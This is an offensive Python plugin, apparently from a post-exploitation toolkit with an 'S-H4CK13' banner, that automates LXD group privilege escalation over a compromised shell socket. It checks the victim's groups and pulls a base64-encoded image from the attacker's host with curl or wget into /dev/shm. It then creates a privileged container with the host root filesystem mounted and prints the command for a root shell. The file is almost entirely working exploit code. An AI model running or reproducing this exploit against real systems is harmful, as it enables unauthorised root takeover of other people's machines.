#!/usr/bin/python3
# @Мартин.
# ███████╗              ██╗  ██╗    ██╗  ██╗     ██████╗    ██╗  ██╗     ██╗    ██████╗
# ██╔════╝              ██║  ██║    ██║  ██║    ██╔════╝    ██║ ██╔╝    ███║    ╚════██╗
# ███████╗    █████╗    ███████║    ███████║    ██║         █████╔╝     ╚██║     █████╔╝
# ╚════██║    ╚════╝    ██╔══██║    ╚════██║    ██║         ██╔═██╗      ██║     ╚═══██╗
# ███████║              ██║  ██║         ██║    ╚██████╗    ██║  ██╗     ██║    ██████╔╝
# ╚══════╝              ╚═╝  ╚═╝         ╚═╝     ╚═════╝    ╚═╝  ╚═╝     ╚═╝    ╚═════╝

from plugin.core import core
import time
 

class lxc:

    def __init__(self, socks, ip, port):
        print("[*] Detecting LXC privilege escalation...")
        self.__check_lxc(socks, ip, port)
        print("[-] Done")


    def __check_lxc(self, socks, ip, port):
        command = 'id -nG'
        core.send_command(socks, command)
        response = core.recv_response(socks)
        groups = response.split()
        if 'lxd' in groups:
            if input(f"[!] Do you want to exploit the vulnerability in file 'lxc' ? (y/n) >").strip().lower() != 'y':
                return False
            self.__exploit(socks, ip, port)
        else:
            print("[-] Unable to use LXC privilege escalation")

    def __exploit(self, socks, ip, port):
        time.sleep(2)
        core.send_command(socks, 'which curl')
        response = core.recv_response(socks,4)
        if '/curl' in response:
            download_command = f"curl http://{ip}:{port}/plugin/lxc.txt | base64 -d >/dev/shm/alp.tar.gz"
        else:
            download_command = f"wget http://{ip}:{port}/plugin/lxc.txt -O - | base64 -d >/dev/shm/alp.tar.gz"

        core.send_command(socks, download_command)
        time.sleep(5)
        core.send_command(socks, 'lxc image import /dev/shm/alp.tar.gz --alias test;lxc storage create default dir;lxc init test ignite -c security.privileged=true -s default;lxc config device add ignite test disk source=/ path=/mnt/root recursive=true;lxc start ignite;')
        print("[+] Try execute command: [$ lxc exec ignite -- sh -c \"cd /mnt/root;sh\"]")
        print("[+] LXD Escalated...")
